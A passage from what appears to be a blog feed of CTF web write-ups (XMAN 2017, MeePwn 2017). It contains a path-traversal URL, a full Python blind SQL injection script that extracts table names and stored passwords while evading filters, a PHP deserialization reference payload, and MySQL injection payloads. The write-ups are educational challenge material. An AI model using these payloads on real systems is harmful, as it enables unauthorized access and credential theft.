<p>找flag的位置花了一点时间。最后paylaod:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../../../../../../../../var/www/flag.txt&amp;type=undefined</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;D0WnL0D_3v3RYTh1ng_You_Win&#125;</div></pre></td></tr></table></figure>
<h1 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h1><p>CVE-2017-4971：Spring WebFlow漏洞。到处找poc。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/3.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/4.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/5.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/6.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UGhoiXoeDae6zeethaxoh1eex3xeiJ7y&#125;</div></pre></td></tr></table></figure>
<p>参考：<a href="https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1" target="_blank" rel="external">https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1</a></p>
<h1 id="CTF用户登录"><a href="#CTF用户登录" class="headerlink" title="CTF用户登录"></a>CTF用户登录</h1><p>在登陆处存在注入，登陆成功与否加载了html标签前，直接用浏览器看是看不到的不会解析。经过fuzz，可以知道过滤了逗号，空格等，但union select，substr，and，or，单引号，#没有过滤。</p>
<ul>
<li><p>逗号被过滤，可以用以下方式绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mid(user() from 1 for 1)</div><div class="line">或</div><div class="line">substr(user() from 1 for 1)</div></pre></td></tr></table></figure>
</li>
<li><p>空格被过滤，可以用tab键绕过，其url编码为%09</p>
</li>
</ul>
<p>所以这题就是盲注，下面附上python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://challenges.xctf.org.cn:8003/login.php"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	parm = <span class="string">"username="</span>+payload+<span class="string">"&amp;password=bb&amp;submit="</span></div><div class="line">	content = requests.post(url,data=parm,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line"></div><div class="line">cuowu = <span class="string">'\u9519\u8bef'</span>.decode(<span class="string">'unicode_escape'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">"a'%09or%09(%09select%09ascii(substr("</span>+generateTarget(target) +<span class="string">"%09from%09"</span>+ str(i) +<span class="string">"%09for%091))&lt;="</span>+str(midNum) +<span class="string">")%23"</span></div><div class="line">		<span class="comment"># print payload</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="comment"># print recv</span></div><div class="line">		<span class="keyword">if</span> cuowu <span class="keyword">in</span> recv:</div><div class="line">			<span class="comment"># print 'cuowu'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># print 'chenggong'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			<span class="comment"># print rightNum</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line"></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The tables:"</span></div><div class="line">	target = <span class="string">"tables"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The columns:"</span></div><div class="line">	target = <span class="string">"columns"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The data:"</span></div><div class="line">	target = <span class="string">"data"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/10.jpg?raw=true" alt=""></p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;DO_you_l1ke_sqlmap_sqlmap&#125;</div></pre></td></tr></table></figure></p>
<h1 id="倾听世界的声音"><a href="#倾听世界的声音" class="headerlink" title="倾听世界的声音"></a>倾听世界的声音</h1><p>XSS，还没开始研究。膜拜大佬。</p>
<p>参考：<a href="http://www.cnblogs.com/zaki-Gui/p/7115821.html" target="_blank" rel="external">http://www.cnblogs.com/zaki-Gui/p/7115821.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XMAN选拔赛-2017-web-writeup 都是基础题目&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Meenpwn-2017-web-writeup</title>
    <link href="http://yoursite.com/2017/07/16/Meenpwn-2017-web-writeup/"/>
    <id>http://yoursite.com/2017/07/16/Meenpwn-2017-web-writeup/</id>
    <published>2017-07-16T01:33:43.000Z</published>
    <updated>2017-07-26T10:57:19.502Z</updated>
    
    <content type="html"><![CDATA[<p>考点：反序列化，rand，sql注入<br><a id="more"></a></p>
<h1 id="TSULOTT"><a href="#TSULOTT" class="headerlink" title="TSULOTT"></a>TSULOTT</h1><p>通过查看源代码，可以发现hint，得到源码，这里只贴重点部分。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">var</span> $jackpot;</div><div class="line">  <span class="keyword">var</span> $enter;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span>(<span class="string">'secret.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))  </div><div class="line">&#123;</div><div class="line">  $obj = unserialize(base64_decode($_GET[<span class="string">'input'</span>]));</div><div class="line">  <span class="keyword">if</span>($obj)</div><div class="line">  &#123;</div><div class="line">    $obj-&gt;jackpot = rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>);</div><div class="line">    <span class="keyword">if</span>($obj-&gt;enter === $obj-&gt;jackpot)</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;CONGRATULATION! You Won JACKPOT PriZe !!! &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>. <span class="string">"&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='20'&gt;"</span>.$obj-&gt;jackpot.<span class="string">"&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='green' size='25'&gt;"</span>.$flag.<span class="string">"&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"</span>;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /&gt;&lt;/center&gt;"</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;Wrong! True Six Numbers Are: &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>. <span class="string">"&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='25'&gt;"</span>.$obj-&gt;jackpot.<span class="string">"&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;- Something wrong, do not hack us please! -&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">""</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;center&gt;</div><div class="line">&lt;br&gt;&lt;h2&gt;&lt;font color=<span class="string">'yellow'</span> size=<span class="number">8</span>&gt;-- TSU&lt;/font&gt;&lt;font color=<span class="string">'red'</span> size=<span class="number">8</span>&gt;LOTT --&lt;/font&gt;&lt;/h2&gt;</div><div class="line">&lt;p&gt;&lt;p&gt;&lt;font color=<span class="string">'white'</span>&gt;Input your code to win jackpot!&lt;/font&gt;&lt;p&gt;</div><div class="line">&lt;form&gt;</div><div class="line">          &lt;input type=<span class="string">"text"</span> name=<span class="string">"input"</span> /&gt;&lt;p&gt;&lt;p&gt;</div><div class="line">          &lt;button type=<span class="string">"submit"</span> name=<span class="string">"btn-submit"</span> value=<span class="string">"go"</span>&gt;send&lt;/button&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'gen_code'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'gen_code'</span>]))</div><div class="line">&#123;</div><div class="line">  $temp = <span class="keyword">new</span> Object;</div><div class="line">  $temp-&gt;enter=$_GET[<span class="string">'gen_code'</span>];</div><div class="line">  $code=base64_encode(serialize($temp));</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;font color=\'white\'&gt;Here is your code, please use it to Lott: &lt;strong&gt;'</span>.$code.<span class="string">'&lt;/strong&gt;&lt;/font&gt;&lt;/center&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;center&gt;</div><div class="line">&lt;font color=<span class="string">'white'</span>&gt;-----------------------------------------------------------------------------------------------------------------------------&lt;/font&gt;</div><div class="line">&lt;h3&gt;&lt;font color=<span class="string">'white'</span>&gt;Take code&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;</div><div class="line">&lt;p&gt;&lt;font color=<span class="string">'white'</span>&gt;Pick your six numbers (Ex: <span class="number">15</span> <span class="number">02</span> <span class="number">94</span> <span class="number">11</span> <span class="number">88</span> <span class="number">76</span>)&lt;/font&gt;&lt;p&gt;</div><div class="line">&lt;form&gt;</div><div class="line">      &lt;input type=<span class="string">"text"</span> name=<span class="string">"gen_code"</span> maxlength=<span class="string">"17"</span> /&gt;&lt;p&gt;&lt;p&gt;</div><div class="line">      &lt;button type=<span class="string">"submit"</span> name=<span class="string">"btn-submit"</span> value=<span class="string">"go"</span>&gt;send&lt;/button&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'is_debug'</span>]) &amp;&amp; $_GET[<span class="string">'is_debug'</span>]===<span class="string">'1'</span>)</div><div class="line">&#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!-- GET is_debug=<span class="number">1</span> --&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure></p>
<p>看到有<code>unserialize</code>，感觉会考反序列化问题。看到有<code>rand()</code>感觉会考随机数预测问题。看到<code>===</code>，一般不存在弱类型问题。从源码上看，这题需要我们预测留个数字，然后序列化再传入并反序列化，与服务器上随机生成的六个数进行对比，若相同则出flag。这题最后用反序列化的方法解出来了。不过这个反序列化的套路跟以前不太一样。利用下面的php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">var</span> $jackpot;</div><div class="line">  <span class="keyword">var</span> $enter;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$chybeta = <span class="keyword">new</span> Object();</div><div class="line">$chybeta-&gt;enter=&amp;$obj-&gt;jackpot;</div><div class="line">$code=base64_encode(serialize($chybeta));</div><div class="line"><span class="keyword">echo</span> $code;</div></pre></td></tr></table></figure></p>
<p>上述代码，将<code>$jackpot</code>的地址赋给<code>$enter</code>，相当于两个指针指到了同一块内存区域，所以不管做什么变化，这两个变量的变化是同步的。</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://128.199.190.23:8001/?input=Tzo2OiJPYmplY3QiOjI6e3M6NzoiamFja3BvdCI7TjtzOjU6ImVudGVyIjtSOjI7fQ%3D%3D&amp;btn-submit=go</div></pre></td></tr></table></figure></p>
<p>FLAG:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MeePwnCTF&#123;__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___&#125;</div></pre></td></tr></table></figure></p>
<p>这个思路当时我想到了但没去尝试，因为当时想的是传给enter的jackpot地址是我本机上的地址，跟服务器上的不同，然后就死磕在rand（）的预测上。在跟一航大佬讨论后，才知道这个姿势可行。永远不要怀疑自己的脑洞。关于php变量的内存分布之后单独开一篇写。</p>
<p>还有就是对rand（）的预测。这个想法不是不无根据，HITCON CTF 2015 Quals Web Giraffe’s Coffee和0CTF 2016 qual rand2都考到过。ph师傅的<a href="https://www.leavesongs.com/PENETRATION/safeboxs-secret.html" target="_blank" rel="external">安全箱子的秘密</a>和Sjoerd Langkemper的<a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="external">Cracking PHP rand()</a>有谈到这个rand()预测的具体技巧和操作。不过我没成功:)</p>
<h1 id="Br0kenMySQL"><a href="#Br0kenMySQL" class="headerlink" title="Br0kenMySQL"></a>Br0kenMySQL</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;</div><div class="line">&lt;p style=<span class="string">'color:Red'</span>&gt;Br0kenMySQL&lt;/p&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>]==<span class="string">'🕵'</span>) <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'config.php'</span>;</div><div class="line"></div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, MYSQL_USER, MYSQL_PASSWORD);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!$link) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!mysqli_select_db($link,MYSQL_USER)) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not select database: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">    $id = $_GET[<span class="string">'id'</span>];</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$id))</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">    $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">    $row = mysqli_fetch_array($query);</div><div class="line">    $username = $row[<span class="string">'username'</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($username === <span class="string">'guest'</span>)&#123;</div><div class="line"></div><div class="line">        $ip = @$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]!=<span class="string">""</span> ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$ip))</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">        var_dump($ip);</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($ip))</div><div class="line">            mysqli_query($link,<span class="string">"INSERT INTO logs VALUES('&#123;$ip&#125;')"</span>);</div><div class="line"></div><div class="line">        $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">        $row = mysqli_fetch_array($query);</div><div class="line">        $username = $row[<span class="string">'username'</span>];</div><div class="line">        <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"What ???????\nLogin as guest&amp;admin at the same time ?\nSeems our code is broken, here is your bounty\n"</span>;</div><div class="line">            <span class="keyword">die</span>(FLAG);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Nothing here"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Hello "</span>.$username;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/h1&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
<p>从源码来看，逻辑上我们得先让<code>$username</code>值为<code>guest</code>进入if判断后，再让<code>$username</code>的值为<code>admin</code>，从而echo出flag。而且<code>$id</code>处可注入。做法是找到一个随机串，利用case语句在不同情况下随机取值，结合爆破，拿flag。<br>题目把<code>rand()</code>，<code>floor()</code>等过滤了，不能直接生成随机数。可以利用mysql内置的一些函数或变量，比如时间戳。因此有了下面的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://139.59.239.133/?id=(SELECT case MOD(UNIX_TIMESTAMP(),3) when 1 then 2 else 1 end;)</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170715/3.jpg?raw=true" alt=""></p>
<p>FLAG:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MeePwnCTF&#123;_b4by_tr1ck_fixed&#125;</div></pre></td></tr></table></figure></p>
<p>除了用UNIX_TIMESTAMP()，其他一些函数/变量也行，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">uuid()</div><div class="line">UUID_SHORT()  // mysql 5.1后有</div><div class="line">CURRENT_TIMESTAMP()</div><div class="line">CURRENT_TIMESTAMP</div><div class="line">CURTIME()</div><div class="line">localtime()</div><div class="line">localtime</div><div class="line">localtimestamp()</div><div class="line">localtimestamp</div><div class="line">now()</div><div class="line">sysdate()</div><div class="line">utc_timestamp()</div></pre></td></tr></table></figure></p>
